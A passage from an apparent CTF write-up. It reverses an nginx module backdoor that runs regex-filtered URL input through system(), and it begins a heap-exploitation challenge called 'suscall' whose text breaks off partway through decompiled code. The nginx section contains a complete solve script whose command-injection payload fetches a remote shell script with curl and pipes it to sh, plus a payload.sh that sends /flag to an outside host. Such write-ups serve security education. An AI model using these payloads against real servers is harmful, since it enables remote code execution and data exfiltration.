</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pcre_copy_substring</span>(subject, ov, rc, <span style="color:#ae81ff">1</span>, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> <span style="color:#a6e22e">strdup</span>(buf);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">system</span>(m);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So, it&rsquo;s clear that we have to control the <code>m</code> variable to execute arbitrary commands :), but we need to bypass some constraints because our input was filtered using the <code>bd_re</code> regex pattern</p>
<p><code>pcre_compile.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(b, <span style="color:#e6db74">&#34;^/&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, alph);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, <span style="color:#e6db74">&#34;/([</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">\$a-zA-Z0-9;:/.|]+)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> eo;
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_compile</span>(b, PCRE_MULTILINE, <span style="color:#f92672">&amp;</span> e, <span style="color:#f92672">&amp;</span> eo, <span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><p>So our input quite equals to <code>^/alph/([\$a-zA-Z0-9;:/.|]+)</code>, which <code>alph</code> from the <code>b.h</code> file</p>
<p><code>pcre_compile.c</code></p>
<pre tabindex="0"><code>char * alph =
#include &#34;b.h&#34;
;
</code></pre><p>the file <code>b.h</code> was generated from these commands</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#66d9ef">$(($(</span>date +%s<span style="color:#66d9ef">)</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">86400</span><span style="color:#66d9ef">))</span> | md5sum | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1 |  awk <span style="color:#e6db74">&#39;{ for(i=0;i&lt;10;i++) printf &#34;%s&#34;, $1 }&#39;</span> &gt; a
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34;</span> | grep -o . | shuf --random-source ./a| tr -d <span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; b.h; rm -f ./a;
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#34;%m.%d.%y&#34;</span> | tr -d <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; d.h
</span></span></code></pre></div><p>I generated a similar python code to make it easier, so the <code>alph</code> string is equal to the hash of the day when the file was created.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time_string <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime(<span style="color:#ae81ff">2024</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>seconds_since_epoch <span style="color:#f92672">=</span> int(time_string<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">86400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>md5_out <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>str(seconds_since_epoch)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(md5_out <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(key)
</span></span></code></pre></div><p>Continue to understand the last logic</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(f, b, <span style="color:#ae81ff">12</span>);
</span></span><span style="display:flex;"><span>    b[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(f);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x130000</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> i;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;g&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;i&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>        p[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>        p[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
</span></span><span style="display:flex;"><span>            c<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>p_page <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uint64_t</span>)p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mprotect</span>(p_page, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">snprintf</span>(p, <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#34;ni/nginx/%s                            &#34;</span>, date_s);
</span></span><span style="display:flex;"><span>            p[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It searches the string <code>nginx/1.18.</code> through the nginx binary base address. If found,  it replaces the <code>nginx/1.18.</code> with the  <code>ni/nginx/date_s</code> string, which is <code>date_s</code> from the <code>d.h</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#34;%m.%d.%y&#34;</span> | tr -d <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; d.h
</span></span></code></pre></div><p>We can know the date because it&rsquo;s returned to us in each request append to ni/nginx/.</p>
<p><img src="https://i.imgur.com/xPKPy3k.png" alt="image"></p>
<p>we get the key <code>wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh</code> by running the following script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time_string <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime(<span style="color:#ae81ff">2006</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>seconds_since_epoch <span style="color:#f92672">=</span> int(time_string<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">86400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>md5_out <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>str(seconds_since_epoch)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(md5_out <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(key)
</span></span></code></pre></div><p>We successfully passed the request to the <code>pcre_exec</code> function and made it return 2</p>
<p><img src="https://i.imgur.com/iIpjZg4.png" alt="image"></p>
<p>Our payload must matches &lsquo;&quot;/([\$a-zA-Z0-9;:/.|]+)&quot;&rsquo; regex.</p>
<p><img src="https://i.imgur.com/qOWE2r0.png" alt="image"></p>
<h2 id="exploit-script">Exploit script</h2>
<p><code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://chiptunegeek.shellweplayaga.me:194/&#34;</span>
</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Ticket&#34;</span>: <span style="color:#e6db74">&#34;ticket{SwapNullmodem1179n24:j89H0k4sPT3D2inNeug6fUCaJQ2Mn0J2-2bNEcpiRfWVbFrR}&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># proxies = {&#34;http&#34;: &#34;http://127.0.0.1:8080&#34;, &#34;https&#34;: &#34;http://127.0.0.1:8080&#34;}</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;curl$IFS$2https://095ab4b1de06dd.lhr.life/payload.sh|sh&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time_string <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime(<span style="color:#ae81ff">2006</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>seconds_since_epoch <span style="color:#f92672">=</span> int(time_string<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">86400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>md5_out <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>str(seconds_since_epoch)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(md5_out <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(key)
</span></span><span style="display:flex;"><span>print(url <span style="color:#f92672">+</span> key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> payload)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> payload, headers<span style="color:#f92672">=</span>header)
</span></span></code></pre></div><p><code>payload.sh</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>cat /flag  | curl -d @- zt66v57a.requestrepo.com
</span></span></code></pre></div><ul>
<li>flag{SwapNullmodem1179n24:6XX8m9VHpq4yNrgtwWAxvuvBQpIys5vbJfA79HZawYgu3as9bn35psDS6OQjG7S2Ha_4ml2mttK_9IoAjCh7zw}</li>
</ul>
<h1 id="pwn---suscall">Pwn - suscall</h1>
<blockquote>
<p>Your Computer is Spying on You. Click here to find out how to Protect yourself!</p>
</blockquote>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-1">Source-code overview</h2>
<p>This challenge makes a custom heap structure in bss section</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> chunk[heap_size];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">*</span> heap_top;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Also, it makes a custom function call <code>galloc</code>, it&rsquo;s aborted if the requested size is greater than the <code>heap_top</code> pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">galloc</span>(<span style="color:#66d9ef">size_t</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)top <span style="color:#f92672">+</span> a1 <span style="color:#f92672">&gt;=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>top )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;block_end &lt; heap_end&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0x44u</span>, <span style="color:#e6db74">&#34;galloc&#34;</span>);
</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> top;
</span></span><span style="display:flex;"><span>  top <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)top <span style="color:#f92672">+</span> a1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(s, <span style="color:#ae81ff">0</span>, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> s;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It&rsquo;s also make a custom <code>sus_file</code> structure and a custom <code>do_open</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> susfile {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>read_line)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buffer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> _padding0;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> buf_size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> buf_cap;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> __padding1;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>reset)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>open_hook)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>do_open</code> first allocates the <code>susfile</code> struct, calls to <code>sys_open</code>, reads from that file, and exits either the content has <code>sus</code> string or not</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>susfile <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sus_open</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  susfile <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// [rsp+18h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dest; <span style="color:#75715e">// [rsp+20h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> n; <span style="color:#75715e">// [rsp+28h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  susfile <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// [rsp+30h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  sysnum_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> (susfile <span style="color:#f92672">*</span>)<span style="color:#a6e22e">galloc</span>(<span style="color:#ae81ff">48uLL</span>);
</span></span><span style="display:flex;"><span>  dest <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">galloc</span>(<span style="color:#ae81ff">16uLL</span>);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>filename <span style="color:#f92672">=</span> dest;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>open_hook <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))open_hook;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>read_line <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))read_file;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>reset <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))reset;
</span></span><span style="display:flex;"><span>  n <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strncpy</span>(dest, a1, n);
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> check;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (flags <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFC</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;flags &gt; 0&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0xBDu</span>, <span style="color:#e6db74">&#34;do_open&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mode )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;mode &gt; 0&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0xBEu</span>, <span style="color:#e6db74">&#34;do_open&#34;</span>);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">syscall</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)sysnum_, dest, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)flags <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFC</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)mode);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>buffer <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">galloc</span>(<span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>buf_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>buf_cap <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
